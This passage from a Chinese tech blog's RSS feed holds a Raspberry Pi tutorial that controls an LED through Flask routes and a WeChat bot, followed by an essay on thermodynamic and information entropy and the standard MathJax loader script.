&lt;span class="nd"&gt;@app.route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/led_down&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;led_down&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# 让GPIO14输出低电平（LED灯灭）&lt;/span&gt;
    &lt;span class="n"&gt;RPi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GPIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ok&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# 使led灯闪烁几次&lt;/span&gt;
&lt;span class="nd"&gt;@app.route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/led_up_down&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;led_up_down&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;RPi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GPIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;# 持续一段时间&lt;/span&gt;
        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;RPi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GPIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ok&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;完整的源码参考&lt;a href="https://github.com/wwj718/raspberrypi_api/edit/master/led_server.py"&gt;led_server.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现在我们可以把服务跑起来了：&lt;code&gt;sudo python led_server.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ps： websocket版本参考这里：&lt;a href="https://github.com/wwj718/raspberrypi_api/blob/master/led_websocket.py"&gt;led_websocket.py&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;测试接口&lt;/h1&gt;
&lt;p&gt;我的树莓派当前ip为：192.168.0.106&lt;/p&gt;
&lt;p&gt;我们对这些api进行测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;点亮红灯： curl 192.168.0.106/led_up&lt;/li&gt;
&lt;li&gt;熄灭红灯： curl 192.168.0.106/led_down&lt;/li&gt;
&lt;li&gt;闪啊闪 ： curl 192.168.0.106/led_up_down&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;你也可以在浏览器里控制这些灯（使用js）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;xmlhttp&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;xmlhttp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.0.106/led_up_down&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;//闪烁&lt;/span&gt;
&lt;span class="nx"&gt;xmlhttp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如此一来我们可以在浏览器里操控硬件了&lt;/p&gt;
&lt;h1&gt;对接微信&lt;/h1&gt;
&lt;p&gt;对接微信这步很简单,如果你读过我之前的文章：&lt;a href="http://blog.just4fun.site/create-wechat-bot.html"&gt;把聊天机器人接入微信&lt;/a&gt;，直接看源码就好了。没读过前文也没关系，代码很好理解，我把核心部分列下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;wxbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WXBot&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="n"&gt;led_server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://127.0.0.1:5000/&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyWXBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WXBot&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_led&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;正在{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_msg_by_uid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;led_server&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;
        &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;完成{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_msg_by_uid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle_msg_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;msg_type_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;user_input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="c1"&gt;#payload={&amp;quot;user_input&amp;quot;:user_input}&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;关&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_led&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;led_down&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;开&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_led&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;led_up&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;闪&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_led&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;led_up_down&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;源码在这里：&lt;a href="https://github.com/wwj718/raspberrypi_api/blob/master/wechat_pi.py"&gt;wechat_pi.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;跑起来就好：&lt;code&gt;python wechat_pi.py&lt;/code&gt;,由于需要微信扫码，所以先把你的树莓派连到屏幕上（使用图形界面），我使用VNC，之后有空把二维码弄到命令行里&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/ledf96a0f7d.png" /&gt;&lt;/p&gt;
&lt;h1&gt;脑洞&lt;/h1&gt;
&lt;p&gt;因为微信能在广域网中使用，所以你可以在任何能联网的地方控制树莓派了，进行远程控制，我最近的一个脑洞是在下班路上用微信给树莓派发一个&lt;code&gt;打开空调&lt;/code&gt;的消息，就可以提前打开空调啦&lt;/p&gt;
&lt;p&gt;原理也很简单使用红外接收器学习空调遥控器的指令集（目前只要开关机的指令），然后使用红外发射器伪造成遥控器控制空调。最后对接到微信即可&lt;/p&gt;
&lt;p&gt;目前采集红外信号部分已经完成了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 29 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-29:pi-wechat.html</guid><category>技术</category></item><item><title>热力学熵与信息熵</title><link>/Entropy.html</link><description>&lt;blockquote&gt;
&lt;p&gt;贝尔实验室和MIT有很多人将香农和爱因斯坦相提并论，而其他人则认为这种对比是不公平的，对香农不公平  -- 威廉·庞德斯通&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这两天晚上在看&lt;code&gt;熵&lt;/code&gt;相关的知识，觉得饶有趣味，做个笔记&lt;/p&gt;
&lt;p&gt;我大学本科学的是&lt;code&gt;热能与动力工程&lt;/code&gt;，大多时间在与热力学打交道。出于对编程的喜爱，毕业后当了程序员。熵是我毕业前后都接触的概念，在热力学和信息论中都极其重要。&lt;/p&gt;
&lt;h1&gt;热力学熵&lt;/h1&gt;
&lt;p&gt;我们先说说热力学第二定律。&lt;/p&gt;
&lt;p&gt;热力学第二定律是热力学的四个基本定律之一（第零定律不大出名：若两个热力学系统均与第三个系统处于热平衡状态，此两个系统也必互相处于热平衡）&lt;/p&gt;
&lt;p&gt;热力学第二定律有多种表述，克劳修斯表述为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不可能把热量从低温物体传递到高温物体而不产生其他影响。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个表述我们在高中物理中应该就见过&lt;/p&gt;
&lt;p&gt;他重点描述了热量传递的不可逆性，如此一来，&lt;a href="https://zh.wikipedia.org/wiki/%E6%B0%B8%E5%8A%A8%E6%9C%BA#.E7.AC.AC.E4.BA.8C.E7.B1.BB.E6.B0.B8.E5.8A.A8.E6.9C.BA"&gt;第二类永动机&lt;/a&gt;梦想宣告破灭&lt;/p&gt;
&lt;h4&gt;插曲：永动机&lt;/h4&gt;
&lt;p&gt;相信不少小时候喜欢折腾机械玩具的小伙伴，都有过永动机的梦想。小时候我设想过几类永动机，印象深刻的一个，是一年小学暑假，把碎了一半的磁铁用胶带粘到玩具小车A的车尾，而相斥的另一半粘到玩具小车B的车头，中间通过一个弹性绳子连接。不知哪来的信心，确信自己解决了人类能源的问题：小车B启动后，靠近小车A，由于磁性，把小车A往前推，之后小车A拉长弹性绳子，拉动小车B，小车B前进，如此周而复始。不需能源便能行驶&lt;/p&gt;
&lt;p&gt;做实验的时候，并不顺利，我发现它们往复几次就停下了，我将其归结为两者重量不合适、绳子的弹性以及初始推力大小的问题，我相信当满足某种比例时（当时模糊觉得是某种组合方式），它们就能永远运动下去，为了找到这个比例，每天下午无聊的时候，玩腻了小霸王游戏机，便拿出玩具车寻找这个合适的比例。&lt;/p&gt;
&lt;h3&gt;数学表述&lt;/h3&gt;
&lt;p&gt;热力学第二定律的数学表述主要借助克劳修斯所引入的&lt;code&gt;熵&lt;/code&gt;的概念，下边的式子描述了热力学系统中熵的增减:&lt;/p&gt;
&lt;div class="math"&gt;$$\Delta S = \frac{\Delta Q}{T}$$&lt;/div&gt;
&lt;p&gt;变量S被定义为&lt;code&gt;熵&lt;/code&gt;，&lt;span class="math"&gt;\(\Delta Q\)&lt;/span&gt; 是系统热的变化，吸热为正，放热为负，T为系统的绝对温度。&lt;/p&gt;
&lt;p&gt;如果&lt;span class="math"&gt;\(\Delta Q = 0\)&lt;/span&gt;，那么&lt;span class="math"&gt;\(\Delta S\)&lt;/span&gt; ≥ 0。意思是一个绝热系统的全部熵不会自动减少。这是热力学第二定律的另一种表述（熵增原理）&lt;/p&gt;
&lt;p&gt;你可能想到那个著名的担忧：如果没有新的能量源源不断流入我们的宇宙，由于熵只增不减，我们的宇宙终将走向无序和寂灭（热寂说）&lt;/p&gt;
&lt;h4&gt;插曲：生命-负熵&lt;/h4&gt;
&lt;p&gt;关于熵增与生命，凯文凯利在《失控》中有段精彩的感慨：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;宇宙中并存着两个趋势。一种是永远下行的趋势，这股力量初时炽热难当，然后嘶嘶作响归于冰冷的死寂。这就是令人沮丧的卡诺第二定律，所有规律中最残酷的法则：所有秩序都终归于混沌，所有火焰都将熄灭，所有变异都趋于平淡，所有结构都终将自行消亡&lt;/p&gt;
&lt;p&gt;第二种趋势与此平行，但产生与此相反的效果。它在热量消散前（因为热必会消散）将其转移，在无序中构建有序。它借助趋微之势，逆流而上。 这股上升之流利用其短暂的有序时光，尽可能抢夺消散的能量以建立一个平台，来为下一轮的有序作铺垫。它倾尽所有，无所保留，其秩序全部用来增强下一轮的复杂性、成长和有序。它以这种方式在混沌中孕育出反混沌，我们称之为生命&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ps：关于生命是否是负熵，反方的有力反驳是生命不是孤立系统，包括地球也不是&lt;/p&gt;
&lt;h3&gt;熵的微观解释&lt;/h3&gt;
&lt;p&gt;热力学第二定律在热力学范畴内是一条经验定律，随着统计力学的发展，这一定律才得到了解释，同时也使其意义更加深远，波及到物理学之外的许多领域&lt;/p&gt;
&lt;p&gt;玻尔兹曼发现单一系统中的熵跟构成热力学性质的微观状态数量相关。微观状态可以以每个组成的原子的位置及动量予以表达&lt;/p&gt;
&lt;p&gt;玻尔兹曼这样来定义熵：&lt;/p&gt;
&lt;div class="math"&gt;$$S = k(ln\Omega)$$&lt;/div&gt;
&lt;p&gt;其中k是玻尔兹曼常数，&lt;span class="math"&gt;\(\Omega\)&lt;/span&gt;则为&lt;code&gt;该宏观状态中所包含之微观状态数量&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;我们知道，熵可以作为混乱程度的度量，可此前无论在热力学第二的表述或是克劳修斯定义的熵中，我们都无从看到这点。&lt;/p&gt;
&lt;p&gt;只有在玻尔兹曼这里，熵才和系统的混乱程度联系起来，因为&lt;span class="math"&gt;\(\Omega\)&lt;/span&gt;可以作为一个系统混乱程度的度量：作为有规律的系统，只有有限的几种构型，而混乱的系统可以有无限多个构型&lt;/p&gt;
&lt;p&gt;维基百科里的这个例子很好：&lt;/p&gt;
&lt;p&gt;设想有一组10个硬币，每一个硬币有两面，掷硬币时得到最有规律的状态是10个都是正面或10个都是反面，这两种状态都只有一种构型（排列）。反之，如果是最混乱的情况，有5个正面5个反面，排列构型可以有 &lt;span class="math"&gt;\({\displaystyle C_{10}^{5}}\)&lt;/span&gt; = 252种&lt;/p&gt;
&lt;p&gt;在微观视角下，如何解释孤立系统熵增的必然性呢，毕竟，如果粒子数量和上边硬币一样多，在瓶子里乱窜，按概率来说。完全可能存在某个时段，熵减啊，诸如原本反向的例子碰壁后都同向了，如此一来&lt;span class="math"&gt;\(\Omega\)&lt;/span&gt;减小，熵不是也减小了么。如果你对这个问题感到疑惑，可以参考&lt;a href="https://www.zhihu.com/question/19753084"&gt;这个回答&lt;/a&gt;。简单来说就是：&lt;strong&gt;熵增，这样一个在微观状态下完全由概率决定的事情，在宏观状态就成了必然&lt;/strong&gt;，在分子数目足够多的时候，只有一种情况最常见最稳定，即所有气体分子均匀分布&lt;/p&gt;
&lt;h1&gt;信息熵&lt;/h1&gt;
&lt;p&gt;1948年，香农这位不世出的天才，将热力学熵，引入到信息论&lt;/p&gt;
&lt;p&gt;在热力学中，熵可以作为混乱程度的度量度量。在信息论中，熵最好理解为不确定性的量度。两者的关联，放到后边论述&lt;/p&gt;
&lt;p&gt;在信息世界，熵越高，则能传输越多的信息，熵越低，则意味着传输的信息越少&lt;/p&gt;
&lt;h3&gt;定义&lt;/h3&gt;
&lt;div class="math"&gt;$$\mathrm{H} (X)=-\sum _{{i}}{{\mathrm  {P}}(x_{i})\log _{b}{\mathrm  {P}}(x_{i})},$$&lt;/div&gt;
&lt;p&gt;b是对数所使用的底，通常是2,自然常数e，或是10，b为2时，熵的单位是bit&lt;/p&gt;
&lt;h1&gt;两者联系&lt;/h1&gt;
&lt;p&gt;在传统热力学中，熵被定义为对系统的宏观测定，并没有涉及概率分布，而概率分布是信息熵的核心定义。&lt;/p&gt;
&lt;p&gt;香农在定义熵时，根据的是玻尔兹曼对熵的统计学定义，所以两者在形式上基本一致，基本意义也完全一样，都是『（拥有某种观测能力的观测者）描述一个系统所需的信息量』。（按&lt;a href="https://www.zhihu.com/question/20992022"&gt;信息熵与热力学熵有什么区别和联系？&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;描述一个系统所需的信息量（信息熵）与观测的精细程度相关，这个精细度存在物理极限，达到物理极限时，玻尔兹曼熵就是信息熵，系统的物理状态数就是这个系统包含的/携带的信息量的上限。就是说，当这个世界的信息量达到（或接近）这个世界本身的玻尔兹曼熵之后，就无法增长了&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%BA%A6%E5%85%8B%E6%96%AF%E9%9F%A6%E5%A6%96"&gt;麦克斯韦妖&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;麦克斯韦妖（Maxwell's demon），是在物理学中假想的妖，能探测并控制单个分子的运动。&lt;/p&gt;
&lt;p&gt;可以表述为：一个绝热容器被分成相等的两格，中间是由“妖”控制的一扇小“门”，容器中的空气分子作无规则热运动时会向门上撞击，“门”可以选择性的将速度较快的分子放入一格，而较慢的分子放入另一格，这样，其中的一格就会比另外一格温度高，可以利用此温差，驱动热机做功。&lt;/p&gt;
&lt;p&gt;这是第二类永动机的一个范例&lt;/p&gt;
&lt;p&gt;可以采用信息熵来消解这个问题：让小妖精行使职责本身——即便只是了解和储存每个分子最初的香农信息——就会给系统带来热力学熵的增加，因此总的来说，系统的熵的总量没有减少&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%86%B5"&gt;维基百科 熵(热力学)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%86%B5_(%E4%BF%A1%E6%81%AF%E8%AE%BA)"&gt;维基百科 熵(信息论)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/19753084"&gt;「熵」是什么？ 怎样以简单易懂的方式向其他人解释？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20992022"&gt;信息熵与热力学熵有什么区别和联系？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%BA%A6%E5%85%8B%E6%96%AF%E9%9F%A6%E5%A6%96"&gt;麦克斯韦妖&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%83%AD%E5%8A%9B%E5%AD%A6%E7%AC%AC%E4%BA%8C%E5%AE%9A%E5%BE%8B"&gt;热力学第二定律&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E7%83%AD%E5%8A%9B%E5%AD%A6"&gt;热力学&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%83%AD%E5%AF%82"&gt;热寂&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%BB%9F%E8%AE%A1%E5%8A%9B%E5%AD%A6"&gt;统计力学&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "center",
        indent = "0em",
        linebreak = "false";

    if (false) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' }, Macros: {} }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
